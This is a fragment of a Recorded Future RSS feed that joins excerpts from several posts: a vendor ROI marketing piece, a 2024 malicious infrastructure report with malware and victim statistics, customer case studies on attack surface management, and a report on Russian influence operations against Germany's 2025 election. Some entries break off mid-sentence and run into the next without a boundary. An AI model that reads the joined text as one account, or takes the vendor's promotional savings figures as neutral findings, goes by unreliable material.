            <content:encoded><![CDATA[<p>Cybersecurity teams face a constant onslaught of critical and potentially catastrophic challenges: from defending against sophisticated ransomware attacks to preventing coordinated nation-state campaigns. To make their challenges worse, teams often struggle with a lack of visibility, alert fatigue, limited resources and manual processes.</p><p>Threat intelligence has emerged as a critical solution to these challenges, providing the context and actionable insights needed to prioritize effectively and respond proactively. Rather than adding to the noise, threat intelligence cuts through it, enabling security teams to work more efficiently, focusing on what matters and responding to it quickly. </p><p>To understand how customers of Recorded Future leverage threat intelligence to act more efficiently, we partnered with third-party research firm <a href="https://app.userevidence.com/user-research-library/recorded-future?per_page=25&page=1&sort_by=updated_at&sort_dir=desc&responded=1&view=card" target="_blank">UserEvidence</a> to collect quantitative ROI data and qualitative feedback to create our newly published report: <a href="https://go.recordedfuture.com/report/how-recorded-future-drives-roi" target="_blank"><strong>How Recorded Future Drives ROI for Cybersecurity Teams</strong></a>. </p><p>The report reveals that by automating manual workflows, streamlining investigations, and enabling teams to focus on what matters most, Recorded Future customers are reporting time savings of over 100 hours per weektranslating to approximately $290,237 in annual productivity gains for the average organization. In this blog post, we explore the reports findings and what our customers have to say about improving efficiency. </p><h2 id="the-growing-need-for-cybersecurity-efficiency">The Growing Need for Cybersecurity Efficiency</h2><p>Security teams across industries are feeling the strain of increasing responsibilities with limited resources. This imbalance often results in:</p><ul><li>Burnout among team members tasked with manual, repetitive processes</li><li>Operational inefficiencies that slow response times</li><li>Difficulty prioritizing among a constant stream of alerts</li><li>Challenges in demonstrating value to organizational leadership</li></ul><p>These challenges create a significant productivity gap that affects not just the security team, but the entire organization&#39;s resilience against cyber threats.</p><p>&quot;Threat intelligence will always improve your visibility. The important part is to do it without overburdening your team. How can we add new threat intelligence use cases without creating a whole load of extra work and alerts to deal with?&quot; explains Jason Steer, CISO at Recorded Future.</p><h2 id="measuring-the-roi-of-recorded-futures-efficiency-gains">Measuring the ROI of Recorded Future&#39;s Efficiency Gains</h2><p>Recent research conducted by UserEvidence paints a compelling picture of how Recorded Future transforms security operations. In a comprehensive survey of security professionals using the platform, the data revealed remarkable efficiency gains realized by teams, for example:</p><ul><li><strong>Teams save an average of 11 hours weekly</strong> on alert triage, investigation, and response</li><li><strong>Threat analysis, hunting, and reporting time reduced by 11 hours weekly</strong></li><li><strong>Brand abuse mitigation efforts streamlined by 8 hours per week</strong></li><li><strong>Spending 7 hours less per week on vendor and supplier evaluation processes</strong></li></ul><p>When translated to financial impact, these productivity improvements add up to approximately <strong>$290,237 in annual savings</strong> for the average organization implementing Recorded Future. Later in this article, well break down the full picture.</p><p>As one <a href="https://app.userevidence.com/assets/4669MYFV" target="_blank">Senior SOC analyst and Threat Intelligence Analyst</a> at an Air Freight &amp; Logistics company reported: &quot;We automated 70% of manual workflows with Recorded Future, cutting investigation times by 50%. This led to a 40% increase in threat detection efficiency and a 30% reduction in response times, enhancing our overall security posture.&quot;</p><p><a href="http://uevi.co/2879KFMW" target="_blank">Valentin Vanlaeys, Threat Intelligence Lead</a> at Proximus Ada, shared similar results: &quot;Thanks to Recorded Future&#39;s valuable and actionable data, we cut our intelligence hunting, reporting, and analysis by 80%.&quot;</p><h2 id="how-recorded-future-transforms-security-operations">How Recorded Future Transforms Security Operations</h2><h3 id="common-challenges-security-teams-face-in-productivity">Common Challenges Security Teams Face in Productivity</h3><h4 id="before-manual-processes-amidst-high-urgency">Before: Manual Processes Amidst High Urgency</h4><p>Without Recorded Future&#39;s automated intelligence capabilities, security teams shoulder the burden of time-consuming manual workflows that may look something like this:</p><ol><li>Finding relevant data sources across open-source intelligence feeds, blogs, news outlets, social media, and forums</li><li>Collecting unstructured and complex data from these sources</li><li>Sifting through the data to separate signal from noise</li><li>Analyzing the information to identify potential threats</li><li>Compiling and distributing reports</li></ol><p>These processes  along with manual alert triage, investigation, and response  arent just frustratingly manual for team members. They also delay or slow down organizations response times. </p><p>Security teams are inundated with alerts, some of which are noise and some of which are relevant and urgent. If they dont have actionable threat intelligence, they cant efficiently gain an understanding of the priority or criticality of each. And when it comes to addressing a security threat, time is of the essence. </p><h4 id="after-actionable-intelligence-and-automation-with-recorded-future">After: Actionable Intelligence and Automation with Recorded Future</h4><p>Recorded Future helps teams efficiently capture, compile, and analyze threat data, turning it into actionable intelligence that teams would otherwise need to triage, investigate, and respond to manually. This frees the security team to focus their energy on responding to high-priority threats and hunting new ones. Rather than struggling to address everything that seems important, they can think strategically about protecting their organization. </p><p>With the Recorded Future Intelligence Platform, teams can shift from reactive to proactive security postures:</p><ul><li><a href="https://www.recordedfuture.com/blog/from-speed-to-consistency-power-automation-for-your-soc" target="_blank"><strong>Intelligence-driven automation across security workflows</strong></a> accelerates identification, investigation, and prioritization of threats</li><li><strong>Streamlined workflows</strong> reduce investigation time by providing immediate context</li><li><strong>Resource optimization</strong> allows skilled analysts to focus on strategic initiatives rather than routine tasks</li></ul><p>As one <a href="https://app.userevidence.com/assets/7691ENSY" target="_blank">Information Security Specialist</a> at an Industrial Conglomerates Company noted: &quot;We use Recorded Future&#39;s risk lists to block malicious IPs with a risk score of 65 or higher. As a result, we automatically make an average of approximately 5 million blocks per day, resulting in a time savings of about 40 hours per month for our team.&quot;</p><p><a href="https://app.userevidence.com/assets/7193MCHB" target="_blank">Jack Edens, IT Security Analyst</a> at Dupaco Credit Union, adds: &quot;Recorded Future was a game-changer for us, transforming how our team managed threats and stayed proactive. With their platform, we automated repetitive reporting tasks, which allowed us to move key resources onto critical issues, tightening our focus on real threats. This shift didn&#39;t just streamline our workflows; it gave us back nearly 50% in efficiency  significant when you&#39;re dealing with a constant flow of new data.&quot;</p><h2 id="real-world-productivity-improvements-by-the-numbers">Real-World Productivity Improvements: By the Numbers</h2><h3 id="how-threat-intelligence-increases-productivity-and-efficiency">How Threat Intelligence Increases Productivity and Efficiency</h3><p>Recorded Future customers achieve a more proactive, productive, and mature threat intelligence program, saving hundreds of thousands of dollars in productivity along the way. </p><p>Here are the activities where they save time and money and improve their processes:</p>  <table>    <tr><td><strong>Activity/Area</strong></td><td><strong>Weekly Time Savings</strong></td></tr>    <tr><td>Alert triage, investigation, & response</td><td>11 hrs</td></tr>    <tr><td>Threat analysis, hunting, & reporting</td><td>11 hrs</td></tr>    <tr><td>Brand abuse mitigation</td><td>8 hrs</td></tr>    <tr><td>Vendor evaluation</td><td>7 hrs</td></tr>    <tr><td>Digital footprint analysis</td><td>8 hrs</td></tr>    <tr><td>Threat landscape analysis</td><td>10 hrs</td></tr>    <tr><td>Senior analyst efficiency</td><td>50 hrs</td></tr>  </table><br><p>Perhaps most significant is the impact on senior analyst efficiency. The average security team at a billion-dollar company saves over 50 hours of senior analyst time per week using Recorded Futureapproximately $70,000 annuallyby shifting routine tasks to junior analysts. This allows experienced team members to focus on strategic initiatives and proactive threat hunting.</p><p>A <a href="https://app.userevidence.com/assets/9789DFRN" target="_blank">Threat Intelligence Analyst</a> at a Construction &amp; Engineering Company explains: &quot;Recorded Future has allowed us to take a more proactive approach to security, in particular with assessing threats to our tech landscape and setting priorities for eligible threat-hunting activities.

While many key 2023 trends persisted  such as Cobalt Strike dominating offensive security tools (OSTs), AsyncRAT and QuasarRAT leading among remote access trojans (RATs), China and the United States (US) being the top hosting locations, and law enforcement actions having often only temporary impact  Insikt Group identified several emerging trends in 2024.</p><p>Notably, malware-as-a-service (MaaS) infostealers, led by LummaC2, grew in prevalence, likely driven by law enforcement actions against competitor infostealers and rapid innovation by LummaC2. Additionally, Android remained the primary target for mobile malware, with Hook leading. While Latrodectus dominated droppers and loaders despite law enforcement disruptions in the loader ecosystem, traffic distribution systems (TDSs) continued to enhance cybercrime efficiency, as seen with TAG-124, and the abuse of content delivery networks (CDNs) like Cloudflare surged. In regards to state-sponsored groups, China notably increased its use of relay networks such as ArcSilt, while Russia continued its abuse of a wide range of <a href="https://www.recordedfuture.com/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses" target="_blank">legitimate internet services (LIS)</a>.</p><p>Defenders should leverage this report&#39;s insights to strengthen security controls by prioritizing top malware and infrastructure techniques, and thereby enhance network monitoring and deploy relevant detections like YARA, Sigma, and Snort. This should be complemented by investments in tracking evolving malicious infrastructure dynamics, conducting threat simulations to test defenses, and effectively monitoring the broader threat landscape. Regarding LIS, defenders must balance blocking, flagging, or allowing high-risk services based on their assessed criticality and risk level.</p><p>As malicious infrastructure evolves and detection improves, Insikt Group expects existing trends to persist in 2025, driven by continuous threat actor innovation rather than drastic shifts. For example, the &quot;as-a-service&quot; ecosystem will likely expand, and threat actors will increasingly rely on legitimate tools, services, and CDNs to evade detection. Furthermore, with growing mobile reliance, Insikt Group expects mobile-based threats to continue to rise. Relay networks, primarily used by Chinese state-sponsored groups up until now, may see broader adoption by cybercriminals and other state-sponsored groups. Lastly, law enforcement actions are expected to have a greater impact due to enhanced international cooperation and accrued expertise in large-scale cybercrime takedowns.</p><h2 id="key-findings">Key Findings</h2><ul><li>MaaS infostealers led in infections in 2024, with LummaC2 dominating command-and-control (C2) servers as continuous innovation and law enforcement actions against rivals like RedLine Stealer reshaped the cybercrime ecosystem.</li><li>AsyncRAT and Quasar RAT remained the top remote access tools (RATs), while MaaS-based malware like DcRAT continued widespread use.</li><li>The US (North America), Brazil (South America), Angola (Africa), France (Europe), India (Asia), and Australia (Oceania) recorded the highest number of victims in their respective regions based on Recorded Future Network Intelligence, with AsyncRAT emerging as the most prevalent malware in most cases. Other significant threats included QuasarRAT and Cobalt Strike.</li><li>Android remained the primary target for mobile malware, with nine of the top ten families focusing on it, alongside the rise of mercenary spyware and potentially unwanted programs (PUPs) like stalkerware.</li><li>Cobalt Strike accounted for two-thirds of offensive security tool command-and-control (C2) servers, with jQuery as the most popular malleable profile and cs2modrewrite targeting the most victim countries. Cobalt Strike is followed by Metasploit, with detections of Sliver and Brute Ratel C4 rising significantly.</li><li>Mozi Botnet was the largest tracked botnet in 2024 based on the number of identified bots, while older botnets remained active, being primarily used for distributed denial-of-service (DDoS) attacks, as well as credential theft and localized attacks, as seen with Fenix Botnet.</li><li>Latrodectus dominated all droppers and loaders in 2024, accounting for 33% of detections, likely driven by law enforcement disruptions in the loader ecosystem, while most top families emerged post-2021, indicating shorter lifespans.</li><li>TDS continued to play a crucial role in cybercrime by improving efficiency, targeting, and profitability while evading detection, exemplified by TAG-124, which served a broad user base, including ransomware groups like Rhysida.</li><li>The US and China dominated malicious hosting, while bulletproof hosting providers like Stark Industries played a growing role in cybercrime infrastructure.</li><li>Chinese state-sponsored groups expanded their use of anonymization networks in 2024 to target entities worldwide, enabling them to blend with legitimate traffic and complicate victim identification, while RedDelta used Cloudflare to proxy C2 traffic and geo-fence malicious files.</li><li>Russian state-sponsored groups increasingly relied on legitimate services like Ngrok, Cloudflare, and Telegram to evade detection, with BlueDelta shifting to Ngrok after takedown efforts and BlueAlpha using Cloudflare Tunnels to stage GammaDrop malware.</li></ul><h2 id="introduction">Introduction</h2><p>Insikt Group proactively identifies and monitors infrastructure associated with hundreds of malware families, threat actors, and other artifacts, including phishing kits, scanners, and relay networks. By automatically validating malicious infrastructure through various proprietary methods on a daily basis, Insikt Group provides accurate risk representation, enabling Recorded Future customers to enhance their detection and defense capabilities.</p><p>Building on Insikt Group&#39;s annual adversary infrastructure reports from <a href="https://www.recordedfuture.com/research/2022-adversary-infrastructure-report" target="_blank">2022</a> and <a href="https://go.recordedfuture.com/hubfs/reports/cta-2024-1209.pdf" target="_blank">2023</a>, the 2024 Malicious Infrastructure Report provides a concise, data-based overview of malicious infrastructure observed throughout 2024. This year, it specifically emphasizes the synergy among passive infrastructure detection, higher-tier infrastructure insights powered by Recorded Future Network Intelligence, and victim identification. Overall, this report is for anyone interested in malicious infrastructure, offering a high-level overview of its current state as well as summaries of key findings to inform decision-making and provide a broad perspective in this highly dynamic environment.</p><p>Recognizing the challenge of categorizing malware types in a mutually exclusive manner due to their overlapping functionalities, this report establishes a set of malware categories to facilitate analysis, as detailed in <strong>Appendix A</strong>, with brief definitions for each. Notably, certain malware categories, such as crypters, have been intentionally excluded due to the usual absence of network artifacts.</p><p>Beyond examining malicious infrastructure through the lens of malware categories, Insikt Group also monitors it by type, with each type assigned a distinct risk scoring within the Recorded Future Intelligence Cloud. This differentiation reflects varying levels of severity  for instance, network traffic to or from a C2 server in a corporate network may indicate higher risk compared to a management panel, as it typically implies active malicious activity. The infrastructure types defined by Insikt Group are detailed in <strong>Appendix B</strong>.</p><h2 id="2024-malicious-infrastructure-insights-by-the-numbers">2024 Malicious Infrastructure Insights by the Numbers</h2><p>Proactively identifying malicious infrastructure is a complex task shaped by various factors. In addition to the vast volume of data, each malware family, version, or infrastructure linked to specific threat actors often employs entirely unique setups. Detection becomes even more challenging due to factors such as hosting behind CDNs like Cloudflare, the use of high or random ports, reliance on <a href="https://www.recordedfuture.com/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses" target="_blank">legitimate internet services</a> such as Discord or Telegram, or the exploitation of compromised infrastructure.</p><p>These setups also evolve continuously, demanding that Insikt Group constantly innovate and refine its tracking methodologies. Considering all these factors, this report examines malicious infrastructure across multiple categories, including infostealers, backdoors and RATs, mobile malware, OSTs, botnets, droppers and loaders, phishing kits, web shells, and ransomware.</p><p>Overall, in 2024, there has been a significant rise in identified malicious infrastructure, driven by an evolving threat landscape and advancements in detection methodologies by Insikt Group. For instance, the number of unique, validated C2 servers doubled from 2023 to 2024, while unique, validated management panels saw a 69% increase over the same period.</p><p>In addition, using Recorded Future Network Intelligence, Insikt Group identified victims in approximately 200 countries worldwide in 2024 based on victim IP address geolocation. Countries in <strong>Figure 1</strong> were categorized into five groups based on the number of unique victims detected, with those showing high exposure being geographically dispersed worldwide. Notably, accurately measuring malware impact across countries is challenging due to variations in population size, digital footprint, analytical biases (for example, the types of malware tracked), internet infrastructure (such as proxies), and the geographical hosting choices of victim organizations.</p><p><img src="https://cms.recordedfuture.com/uploads/Fig_1_86418b387b.png" alt="Malware impact by country"><em><strong>Figure 1:</strong> Malware impact by country based on Recorded Future Network Intelligence (Source: Recorded Future)</em></p><p><strong>Figure 2</strong> shows the distribution of victims by country across different continents. In North America, the US is the most targeted country, accounting for around 87% of unique victims in the region despite making up only about half of its population. The high victim count in the US is likely driven by factors such as its large population, extensive digital footprint, widespread English use (exploited in phishing campaigns), and economics, while also being influenced by the country&#39;s role as a global infrastructure hub, providing hosting and digital services to organizations worldwide. Most victims are linked to AsyncRAT, followed by SolarMarker RAT and QuasarRAT (see <strong>Table 1</strong>). Notably, unlike AsyncRAT and QuasarRAT, SolarMarker RAT is <a href="https://www.recordedfuture.com/research/exploring-the-depths-of-solarmarkers-multi-tiered-infrastructure" target="_blank">believed</a> to be operated by a single threat actor and has previously been observed predominantly targeting the US.</p><p><img src="https://cms.recordedfuture.com/uploads/Fig_2_529f459d62.png" alt="victim by country"><em><strong>Figure 2:</strong> Shares of unique victim by country and continent (Source: Recorded Future)</em></p><p>In South America, Brazil recorded the highest number of unique victims, accounting for 86% of the regions total, while also only making up around half of the continents population. Previously <a href="https://www.forbes.com/sites/angelicamarideoliveira/2023/09/27/brazil-is-the-worlds-second-most-vulnerable-country-to-cyberattacks/" target="_blank">identified</a> as one of the countries most vulnerable to cyberattacks, Brazil has long been a hotspot for both global and local cyber threats, <a href="https://www.ox.ac.uk/news/2024-04-10-world-first-cybercrime-index-ranks-countries-cybercrime-threat-level" target="_blank">ranking</a> high in cybercrime activity, with groups like Grandoreiro operating almost exclusively within its borders. In 2024, QuasarRAT infections were the most prevalent among Brazilian victims, followed by infections linked to AsyncRAT and SectopRAT.</p><p>In Africa, Angola recorded the highest number of unique victims, followed by Ghana, South Africa, the Republic of the Congo, and the Democratic Republic of the Congo. Notably, in two of the five most targeted African countries, PlugX, a malware linked to multiple Chinese state-sponsored groups, ranked among the most prevalent malware.</p><p>In Europe, France had the highest number of unique victims, followed by Germany, the United Kingdom, the Netherlands, and Poland. AsyncRAT was the most prevalent malware across all five countries, with Cobalt Strike ranking second in three of them. The distribution of victims in these top five countries closely aligns with their population sizes. Notably, in the Netherlands, GobRAT  a backdoor targeting Linux routers with malware written in Go  ranked among the top three malware families.</p><p>In Asia, India recorded the highest number of unique victims, followed by China, Indonesia, Thailand, and Hong Kong. Approximately 73% of all victims in these countries were linked to AsyncRAT, QuasarRAT, and Cobalt Strike infections. Notably, Brute Ratel C4 ranked among the top three malware in Hong Kong, highlighting its growing significance.</p><p>In Oceania, Australia accounted for 87% of all unique victims despite making up only 60% of the region&#39;s population. AsyncRAT was the most prevalent malware, linked to over half of Australia&#39;s victims, while in New Zealand, 67% of victims were associated with AsyncRAT infections.</p><p><strong>Table 1</strong> presents the full list of the top three malware families for each of the five leading countries in each continent, based on the number of unique victims observed by Insikt Group in those countries.

            <content:encoded><![CDATA[<p>Modern attack surfaces extend across every place your business operates, from your first-party technology assets to your third-party network of suppliers and vendors. To spot risks before attackers do, you need to maintain continuous visibility across this expanding landscape. Employee credentials can become compromised, unknown or vulnerable internet assets can be exploited, and supply chain partners with spotty security hygiene can provide adversaries with easy access to your network and data. </p><p>At Recorded Future, weve seen firsthand how practitioners are transforming their security programs by adopting proactive strategies to protect their first- and third-party attack surfaces. </p><p>In our experience, security teams that successfully defend against these threats share a common approach: They combine comprehensive visibility with contextual intelligence.  </p><p>By understanding not just the risks that exist, but why those risks matter to the organization, these security teams enable rapid, informed decision-making that strengthens their security posture.</p><p>In this blog post, well explore how a few select customers are taking an intelligence-led approach to reducing attack surface risks. Youll discover how:</p><ul><li>Toyota Motor North America <strong>quickly remediates compromised employee credentials</strong> to prevent unauthorized access.</li><li>Cummins <strong>identifies and secures internet-facing assets</strong> to reduce their vulnerable attack surface.</li><li>Novavax <strong>takes an intelligence-driven approach to vendor risk management</strong> for greater supply chain resilience.</li><li>INVESTBANK <strong>maintains continuous awareness of vulnerabilities</strong> alongside new updates and releases.</li></ul><p>See the impactful results these companies have achieved, and learn how we can empower your security team to stay ahead of threats and build lasting resilience.</p><h2 id="toyota-motors-north-america-defends-the-human-identity-attack-surface">Toyota Motors North America Defends the Human Identity Attack Surface</h2><p><em>&quot;The timeliness of being able to take compromised credentials out of the marketplace is really beneficial.&quot;</em>  Curtis Hartsell, CTI Manager, Toyota Motors North America (<a href="https://www.recordedfuture.com/videos/toyota" target="_blank">watch the full video here</a>)</p><p>According to the <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf" target="_blank">2024 Verizon Data Breach Investigation Report</a>, 31% of all breaches over the last 10 years have involved the use of stolen credentials. With the rise of stealthy infostealers, threat actors are more likely to log in with stolen credentials than hack their way in. The Verizon report also found more than a thousand credentials being posted for sale on the dark web each day, with an average price of $10, proving that theres serious demand from cybercriminals. </p><p>To help Toyota Motors North America gain an edge, Cyber Threat Intelligence Manager Curtis Hartsell relies on Recorded Futures <a href="https://www.recordedfuture.com/products/identity-intelligence" target="_blank">Identity Intelligence Module</a>. The product allows Hartsell and team to take swift action on compromised credentials, automating credential resets before bad actors can gain access to the companys systems. </p><p>In one example, he said, We had a compromised credential at 7 oclock. Two hours later Identity [Intelligence] is notifying of those compromised credentials, and about thirty or forty minutes after the Identity Module alert, we see attempts to use that account. </p><p>Immediate visibility into newly compromised credentials helps Toyota Motors North America automate response actions and secure accounts instantly. This automation eliminates the need for constant manual intervention, allowing Hartsell and team to focus on higher-value tasks. </p><h2 id="cummins-identifies-and-reduces-attack-surface-risk">Cummins Identifies and Reduces Attack Surface Risk</h2><p><em>We have two main problem statements when were looking at this attack surface problem: What is our attack surface? And then how do we secure it? Theres a couple of different actions you take, whether its remediation or reduction. We love reduction. If it cant be on the internet. Great. Lets get it off there.</em>  Mattheus Bittick, Attack Surface Reduction Analyst, Cummins (watch the full video <a href="https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&wmediaid=1j7x7zezcc" target="_blank">here</a>)</p><p>Continuous monitoring of your first-party attack surface  everything in your network and systems that can be accessed from the internet   is resource-intensive and challenging, especially given that employees and contractors often spin up assets outside your security teams purview. This should be a major concern, as 76% of organizations have suffered a cyberattack that started with the exploit of an unknown, unmanaged, or poorly managed internet-facing asset (<a href="https://www.techtarget.com/searchsecurity/opinion/Why-companies-need-attack-surface-management-in-2024" target="_blank">TechTarget</a>).</p><p>Before implementing Recorded Futures <a href="https://www.recordedfuture.com/products/attack-surface-intelligence" target="_blank">Attack Surface Intelligence Module</a>, Cummins Attack Surface Reduction Analyst Mattheus Bittick said his team spent around 80 hours per week trying to analyze and map the companys external attack surface. And even then, the team was blind to around 20% of the landscape. </p><p>With no capacity for continuous scanning and information-gathering and no existing inventory specific to external-facing assets, Bitticks team was unable to prioritize risks based on the attackers perspective. And since the company has had an internet presence for a long period of time, there was a large unexplored landscape of unknown unknowns and abandoned infrastructure. </p><p>Now, Attack Surface Intelligence is a central technology for the Cummins Attack Surface Risk Management Program.</p><p><em>The first tool I go to every morning is Attack Surface Intelligence. Whats new today? Whats going on that we need to prioritize and triage? Recorded Future shows us how we can take action, and takes our risk assessments to the next level.</em>  Mattheus Bittick, Attack Surface Reduction Analyst, Cummins</p><p>Thanks to automated discovery and attribution of assets associated with the organization, Bittick and team get a real-time view of their external attack surface, from the same perspective as an attacker. This increased visibility into key areas of risk like vulnerabilities, misconfigurations, and shadow IT has helped Cummins reduce its vulnerable attack surface by 51% over a period of six months. And by removing key areas of risk and decommissioning forgotten infrastructure, the company has reduced its cyber insurance premiums by 32% year-over-year. </p><h2 id="novavax-proactively-monitors-for-third-party-vendor-breaches">Novavax Proactively Monitors for Third-Party Vendor Breaches</h2><p><em>We sharpened a lot of processes by introducing Third-Party Intelligence to our risk assessments, so we can make informed decisions about the vendors we do business with[Recorded Future] gives us an opportunity to launch an investigation to see what the vendor has access to, what we need to be concerned about, and how we can better protect ourselves.</em>  Nathalie Salisbury, Strategic Threat Intelligence Analyst, Novavax (Watch the full video <a href="https://www.recordedfuture.com/videos/novavax" target="_blank">here</a>)</p><p>Since third-party vendors arent always held to the same standards as enterprise organizations, those with spotty security hygiene can become the soft underbelly of your attack surface. <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf" target="_blank">According to the 2024 Verizon Data Breach Investigation Report</a>, 15% of breaches involved a third party or supplier. And the <a href="https://www.ibm.com/downloads/documents/us-en/107a02e94948f4ec" target="_blank">IBM Cost of a Data Breach 2024 Report</a> found that the average cost of a breach increased by $240,599 when it came via a third party.</p><p>Making matters worse, supply chain partners often delay or withhold disclosure of security incidents due to concerns about reputation and liability. As they take time to investigate and formulate damage-control strategies, the companies that rely on them may be unaware that their own systems are under attack or that their data has been compromised.</p><p>Nathalie Salisbury, Strategic Threat Intelligence Analyst at <a href="https://www.recordedfuture.com/case-study/novavax" target="_blank">Novavax</a>, says that Recorded Futures <a href="https://www.recordedfuture.com/products/third-party-intelligence" target="_blank">Third-Party Intelligence Module</a> shines a light on these risks before vendors disclose them. </p><p>A couple of times now, Recorded Future has alerted us to something prior to the third-party vendor, she said. Thats huge when were trying to protect our data. That gives us an opportunity to launch an investigation and see what the compromised vendor had access to, [what] we need to be concerned about, and [how to] evaluate our overall third-party risk.</p><p>As a result, Recorded Future is a critical part of the teams proactive approach to managing their third-party attack surface, both in evaluating new vendors and continuously monitoring existing ones. </p><h2 id="investbank-continuously-monitors-and-protects-against-vulnerabilities">INVESTBANK Continuously Monitors and Protects Against Vulnerabilities</h2><p><em>Vulnerability Intelligence provides access to a large database of exploits and vulnerabilities so that we can remit them faster and implement compensation controls until a patch is released.</em>  Riyad Jazmawi, Head of Information Security. (Read the full case study <a href="https://www.recordedfuture.com/case-study/investbank" target="_blank">here</a>).</p><p>Vulnerabilities continue to be one of the top initial access vectors for threat actors. In fact, 2024 might have been a watershed for vulnerability exploitation. When Verizon looked at the critical paths attackers use to initiate breaches, <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf" target="_blank">their research found</a> that vulnerability exploitation grew 3X year-over-year.</p><p>This will come as little surprise to those whove tracked prominent ransomware groups over the past year. The exploitation of Progress Softwares <a href="https://www.recordedfuture.com/blog/2023-threat-analysis-and-2024-predictions" target="_blank">MOVEit</a> and other Managed File Transfer (MFT) products, such as <a href="https://www.recordedfuture.com/blog/cleo-mft-cve-2024-50623-vulnerability-analysis" target="_blank">Cleo MFT</a>, have enabled threat actors to successfully pull off a number of large-scale breaches. </p><p><a href="https://www.recordedfuture.com/case-study/investbank" target="_blank">INVESTBANK</a> wanted to respond more productively to zero-day exploits and vulnerabilities being exploited in the wild. As a fast-moving organization with many digital services, it needed to ensure that it could maintain continuous awareness of any PoCs or critical vulnerabilities in its tech stack. </p><p>Recorded Futures <a href="https://www.recordedfuture.com/products/vulnerability-intelligence" target="_blank">Vulnerability Intelligence Module</a> has helped the company improve its defenses against vulnerabilities.</p><p>Vulnerability Intelligence provides access to a large database of exploits and vulnerabilities so that we can remit them faster and implement compensation controls until a patch is released, said Riyad Jazmawi, Head of Information Security. </p><p>To reduce risk, organizations must have visibility into the vulnerabilities in their tech stacks, and they need the context to make patching prioritization decisions. <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf" target="_blank">Verizon</a> found that it takes 55 days to remediate 50% of CISA Known Exploited Vulnerabilities (KEV) once patches become available. </p><p>With Recorded Futures Vulnerability Intelligence, you can pinpoint and take action on vulnerabilities to keep attackers from gaining access to your network and data.</p><h2 id="conclusion">Conclusion</h2><p>As a security leader, you need visibility into any first-party or third-party asset that could be targeted and exploited by threat actors  and you need context to understand how to prioritize and mitigate threats.To learn more about how Recorded Future can help you take the next step in strengthening your organizations defenses, <a href="https://go.recordedfuture.com/demo?utm_campaign=demo-button-2023-top-nav-bar&utm_source=recordedfuture&utm_medium=website&utm_content=20231003&utm_term=website" target="_blank">request a custom demo</a>. </p>]]></content:encoded>

Learn about their tactics, impacts, and how to mitigate the risks to media integrity and public trust.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>The German federal elections, scheduled for February 23, 2025, are the target of malign influence operations linked to Russia and Russia-based actors. As of mid-February 2025, Insikt Group assesses that, despite their persistence, these efforts have very likely not meaningfully altered voter behavior or shaped public opinion in a manner advantageous to Russias broader geopolitical interests, consistent with <a href="https://www.brookings.edu/articles/the-impact-of-russian-interference-on-germanys-2017-elections/">assessments</a> of Russian meddling attempts in previous German election cycles. </p><p>The influence operations and corresponding networks tracked in this report  Doppelgnger, Operation Overload, CopyCop, Operation Undercut, and the Russia-based Foundation to Battle Injustice  are longstanding and at least partially Kremlin-funded. These operations almost certainly seek to incite and escalate German domestic socio-political conflicts, pollute the German information space by introducing manipulated content, foster criticism of the United States (US) and European Union (EU) and European integration, and undermine North Atlantic Treaty Organization (NATO) cohesion in line with the Kremlins strategic objectives.</p><p>The 2025 German election cycle marks a period of evolution for several of these operations, while core narratives remain unchanged. For example, Doppelgnger and Operation Overload have expanded beyond mainstream social media to Bluesky Social (Bluesky), in an attempt to capture migrating audiences. Doppelgnger and CopyCop have launched new brands and websites to project influence and reinforce messaging in the face of intensified scrutiny of their operations. Operation Overload continues to use artificial intelligence (AI)-based tools, including the use of AI-enabled voice cloning technology to create audio deepfakes, while both Operation Overload and Operation Undercut pose as real news organizations to increase their credibility.</p><p>Despite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content  rather than exposing the tactics behind it  may amplify malign messaging. Regarding Operation Overload specifically, we continue to assess that the potential for significant breakout does exist, as evidenced in the <a href="https://meduza.io/en/feature/2025/02/06/elon-musk-and-trump-jr-repost-fake-e-news-video-about-usaid-created-by-pro-kremlin-disinformation-network">viral spread</a> of a recent video attributed to this network that disparaged the United States Agency for International Development (USAID) in social media. To mitigate these risks, media entities, the public sector, and researchers should continue monitoring known influence networks while limiting engagement with operations such as Doppelgnger, Operation Overload, and Operation Undercut.

Throughout 2024, researchers, government entities, and technology companies <a href="https://www.qurium.org/alerts/exposing-the-evil-empire-of-doppelganger-disinformation/">continued</a> <a href="https://www.qurium.org/forensics/when-kehr-meets-vextrio/">exposing</a> Doppelgnger&#39;s activities across Europe and North America, leading to a US Department of Justice <a href="https://www.justice.gov/opa/pr/justice-department-disrupts-covert-russian-government-sponsored-foreign-malign-influence">indictment</a> against its operators at the Social Design Agency (SDA), international sanctions on SDA and affiliated entities, and at least partial  though often temporary  disruptions to its operations through takedowns and seizures. In response, SDA typically attempted to reestablish its operations within hours to days by deploying new infrastructure.</p><p>While Doppelgnger is best known for the <a href="https://www.disinfo.eu/doppelganger/">direct impersonation</a> of legitimate Western media organizations, the influence operation has also managed a multitude of its own original news website brands, each targeting a specific country (such as Germany), with content directly tailored to the key domestic and foreign policy issues of that target audience, such as immigration policy, Germanys ongoing socio-economic challenges, and questions of Germanys place as Europes leader (as seen in <strong>Figure 1</strong>). Insikt Group has observed Doppelgnger abandoning several of its legacy brand websites with attempts to establish new brands, including multiple websites specific to German politics, likely due to a combination of repeated discovery and disruption of several of these websites. </p><p>While we continue to observe Doppelgnger evolve its tactics and attempt to evade defenders, its ability to meaningfully impact public discourse very likely remains limited. Despite continued efforts to expand its network, Doppelgnger remains constrained by low levels of engagement, with minimal views and interactions across its newly launched domains and social media brands.</p><h3 id="using-new-infrastructure-to-deliver-old-themes">Using New Infrastructure to Deliver Old Themes</h3><p>Since October 2024, Insikt Group has tracked a series of new domain registrations, discovering web page infrastructure that overlaps with previously attributed Doppelgnger-controlled domains.

